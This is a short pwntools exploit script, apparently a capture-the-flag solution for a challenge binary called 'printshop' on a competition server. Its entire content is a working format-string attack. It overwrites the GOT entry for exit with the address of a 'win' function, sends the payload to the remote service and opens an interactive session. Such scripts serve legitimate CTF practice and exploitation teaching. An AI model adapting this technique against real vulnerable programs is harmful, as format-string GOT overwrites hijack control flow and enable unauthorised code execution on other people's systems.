from pwn import * 
context(arch='amd64', os='linux')
e = ELF('./printshop')
r = remote('chal.pctf.competitivecyber.club', 7997)
payload = fmtstr_payload(6, {e.got['exit']: e.sym['win']})
r.sendline(payload)
r.interactive()


